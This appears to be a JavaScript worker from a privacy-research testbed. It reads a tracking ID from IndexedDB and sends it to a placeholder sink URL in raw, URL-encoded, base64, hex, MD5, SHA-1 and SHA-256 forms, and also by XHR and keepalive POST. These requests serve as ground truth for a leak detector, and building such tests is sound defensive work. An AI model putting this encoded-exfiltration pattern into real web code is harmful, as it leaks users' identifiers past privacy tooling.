// PrivaDB ground-truth dedicated worker (testbed/pages/wk.js).
// Reads TID from IndexedDB INSIDE the worker and exfiltrates it through
// every Phase-3 transform variant + two extra sink types. Ground truth:
// ground_truth.py WORKER_FLOWS (paths below must match exactly).
// Served by run_smoke.PageHandler with __SINK_BASE__ replaced.
const SINK = "__SINK_BASE__";

function b64(s) { return btoa(s); }
function b64url(s) {
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function hexutf8(s) {
  const bytes = new TextEncoder().encode(s);
  return Array.from(bytes).map((x) => x.toString(16).padStart(2, "0")).join("");
}
async function digest(alg, s) {
  const buf = await crypto.subtle.digest(alg, new TextEncoder().encode(s));
  return Array.from(new Uint8Array(buf))
    .map((b) => b.toString(16).padStart(2, "0")).join("");
}
// md5: RFC1321 pure-JS (block-boundary + unicode verified against
// hashlib via node before landing; see evaluate.py startup check)
function md5(str) {
  function add32(a, b) { return (a + b) & 0xFFFFFFFF; }
  function rol(n, c) { return (n << c) | (n >>> (32 - c)); }
  function cmn(q, a, b, x, s, t) { return add32(rol(add32(add32(a, q), add32(x, t)), s), b); }
  function ff(a,b,c,d,x,s,t){ return cmn((b & c) | ((~b) & d), a, b, x, s, t); }
  function gg(a,b,c,d,x,s,t){ return cmn((b & d) | (c & (~d)), a, b, x, s, t); }
  function hh(a,b,c,d,x,s,t){ return cmn(b ^ c ^ d, a, b, x, s, t); }
  function ii(a,b,c,d,x,s,t){ return cmn(c ^ (b | (~d)), a, b, x, s, t); }
  function md5cycle(x, k) {
    var a=x[0],b=x[1],c=x[2],d=x[3];
    a=ff(a,b,c,d,k[0],7,-680876936);   d=ff(d,a,b,c,k[1],12,-389564586);
    c=ff(c,d,a,b,k[2],17,606105819);    b=ff(b,c,d,a,k[3],22,-1044525330);
    a=ff(a,b,c,d,k[4],7,-176418897);    d=ff(d,a,b,c,k[5],12,1200080426);
    c=ff(c,d,a,b,k[6],17,-1473231341);  b=ff(b,c,d,a,k[7],22,-45705983);
    a=ff(a,b,c,d,k[8],7,1770035416);    d=ff(d,a,b,c,k[9],12,-1958414417);
    c=ff(c,d,a,b,k[10],17,-42063);      b=ff(b,c,d,a,k[11],22,-1990404162);
    a=ff(a,b,c,d,k[12],7,1804603682);   d=ff(d,a,b,c,k[13],12,-40341101);
    c=ff(c,d,a,b,k[14],17,-1502002290); b=ff(b,c,d,a,k[15],22,1236535329);
    a=gg(a,b,c,d,k[1],5,-165796510);    d=gg(d,a,b,c,k[6],9,-1069501632);
    c=gg(c,d,a,b,k[11],14,643717713);   b=gg(b,c,d,a,k[0],20,-373897302);
    a=gg(a,b,c,d,k[5],5,-701558691);    d=gg(d,a,b,c,k[10],9,38016083);
    c=gg(c,d,a,b,k[15],14,-660478335);  b=gg(b,c,d,a,k[4],20,-405537848);
    a=gg(a,b,c,d,k[9],5,568446438);     d=gg(d,a,b,c,k[14],9,-1019803690);
    c=gg(c,d,a,b,k[3],14,-187363961);   b=gg(b,c,d,a,k[8],20,1163531501);
    a=gg(a,b,c,d,k[13],5,-1444681467);  d=gg(d,a,b,c,k[2],9,-51403784);
    c=gg(c,d,a,b,k[7],14,1735328473);   b=gg(b,c,d,a,k[12],20,-1926607734);
    a=hh(a,b,c,d,k[5],4,-378558);       d=hh(d,a,b,c,k[8],11,-2022574463);
    c=hh(c,d,a,b,k[11],16,1839030562);  b=hh(b,c,d,a,k[14],23,-35309556);
    a=hh(a,b,c,d,k[1],4,-1530992060);   d=hh(d,a,b,c,k[4],11,1272893353);
    c=hh(c,d,a,b,k[7],16,-155497632);   b=hh(b,c,d,a,k[10],23,-1094730640);
    a=hh(a,b,c,d,k[13],4,681279174);    d=hh(d,a,b,c,k[0],11,-358537222);
    c=hh(c,d,a,b,k[3],16,-722521979);   b=hh(b,c,d,a,k[6],23,76029189);
    a=hh(a,b,c,d,k[9],4,-640364487);    d=hh(d,a,b,c,k[12],11,-421815835);
    c=hh(c,d,a,b,k[15],16,530742520);   b=hh(b,c,d,a,k[2],23,-995338651);
    a=ii(a,b,c,d,k[0],6,-198630844);    d=ii(d,a,b,c,k[7],10,1126891415);
    c=ii(c,d,a,b,k[14],15,-1416354905); b=ii(b,c,d,a,k[5],21,-57434055);
    a=ii(a,b,c,d,k[12],6,1700485571);   d=ii(d,a,b,c,k[3],10,-1894986606);
    c=ii(c,d,a,b,k[10],15,-1051523);    b=ii(b,c,d,a,k[1],21,-2054922799);
    a=ii(a,b,c,d,k[8],6,1873313359);    d=ii(d,a,b,c,k[15],10,-30611744);
    c=ii(c,d,a,b,k[6],15,-1560198380);  b=ii(b,c,d,a,k[13],21,1309151649);
    a=ii(a,b,c,d,k[4],6,-145523070);    d=ii(d,a,b,c,k[11],10,-1120210379);
    c=ii(c,d,a,b,k[2],15,718787259);    b=ii(b,c,d,a,k[9],21,-343485551);
    x[0]=add32(a,x[0]); x[1]=add32(b,x[1]); x[2]=add32(c,x[2]); x[3]=add32(d,x[3]);
  }
  // utf-8 encode
  var s = unescape(encodeURIComponent(str));
  var byteLen = s.length;
  var nBlocks = Math.floor((byteLen + 8) / 64) + 1;
  var totalBytes = nBlocks * 64;
  var buf = new Array(totalBytes);
  for (var b = 0; b < totalBytes; b++) buf[b] = 0;
  for (var i = 0; i < byteLen; i++) buf[i] = s.charCodeAt(i) & 0xFF;
  buf[byteLen] = 0x80;
  var bitLen = byteLen * 8;
  buf[totalBytes - 8] = bitLen & 0xFF;
  buf[totalBytes - 7] = (bitLen >>> 8) & 0xFF;
  buf[totalBytes - 6] = (bitLen >>> 16) & 0xFF;
  buf[totalBytes - 5] = (bitLen >>> 24) & 0xFF;
  var state = [1732584193, -271733879, -1732584194, 271733878];
  for (b = 0; b < totalBytes; b += 64) {
    var k = [];
    for (var w = 0; w < 16; w++) {
      var o = b + w * 4;
      k[w] = buf[o] | (buf[o+1] << 8) | (buf[o+2] << 16) | (buf[o+3] << 24);
    }
    md5cycle(state, k);
  }
  var hex = "0123456789abcdef", out = "";
  for (i = 0; i < 4; i++)
    for (var j = 0; j < 4; j++)
      out += hex.charAt((state[i] >> (j * 8 + 4)) & 0x0F) +
             hex.charAt((state[i] >> (j * 8)) & 0x0F);
  return out;
}

function readTid() {
  return new Promise((resolve) => {
    try {
      const req = indexedDB.open("wk_db", 1);
      req.onupgradeneeded = (e) => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains("ids"))
          db.createObjectStore("ids");
      };
      req.onsuccess = (e) => {
        const db = e.target.result;
        try {
          const tx = db.transaction("ids", "readonly");
          const g = tx.objectStore("ids").get("tid");
          g.onsuccess = () => resolve(g.result);
          g.onerror = () => resolve(null);
        } catch (err) { resolve(null); }
      };
      req.onerror = () => resolve(null);
    } catch (e) { resolve(null); }
  });
}

async function run() {
  const tid = await readTid();
  if (!tid) { postMessage("wk-fail:notid"); return; }
  const CSRF = "csrf-11223344556677889900aabbccddeeff";
  const VERSION = "v1.2.3-build.987654321";
  const enc = (s) => encodeURIComponent(s);

  // ── 11 transform variants of TID (dedicated worker) ──
  try { fetch(`${SINK}/v/wraw?x=${tid}`); } catch (e) {}
  try { fetch(`${SINK}/v/wenc?x=${enc(tid)}`); } catch (e) {}
  try { fetch(`${SINK}/v/wenc2?x=${enc(enc(tid))}`); } catch (e) {}
  try { fetch(`${SINK}/v/wb64?x=${b64(tid)}`); } catch (e) {}
  try { fetch(`${SINK}/v/wb64u?x=${b64url(tid)}`); } catch (e) {}
  try { fetch(`${SINK}/v/whex?x=${hexutf8(tid)}`); } catch (e) {}
  try { fetch(`${SINK}/v/wmd5?x=${md5(tid)}`); } catch (e) {}
  try {
    const h1 = await digest("SHA-1", tid);
    fetch(`${SINK}/v/wsha1?x=${h1}`);
  } catch (e) {}
  try {
    const h256 = await digest("SHA-256", tid);
    fetch(`${SINK}/v/wsha256?x=${h256}`);
    fetch(`${SINK}/v/wencsha?x=${await digest("SHA-256", enc(tid))}`);
  } catch (e) {}
  try { fetch(`${SINK}/v/wtrunc?x=${tid.slice(0, 16)}`); } catch (e) {}

  // ── sink diversity on raw TID from the worker ──
  try {
    const x = new XMLHttpRequest();
    x.open("POST", `${SINK}/v/wxhr`);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(JSON.stringify({ d: tid }));
  } catch (e) {}
  // sendBeacon is NOT exposed in Firefox worker scopes (probe16:
  // typeof navigator.sendBeacon === "undefined" in DedicatedWorker-
  // GlobalScope) — use the standard beacon equivalent: POST fetch with
  // keepalive:true. Hook records it as op=fetch with a body, so the
  // ground-truth path /v/wbeacon still exercises a POST-body sink.
  try {
    fetch(`${SINK}/v/wbeacon`, { method: "POST", body: tid,
                                 keepalive: true });
  } catch (e) {}

  // ── benign controls from the worker (must stay unflagged) ──
  try { fetch(`${SINK}/v/wcsrf?x=${CSRF}`); } catch (e) {}
  try { fetch(`${SINK}/v/wcdn?x=${encodeURIComponent(VERSION)}`); } catch (e) {}

  postMessage("wk-done");
}
run();
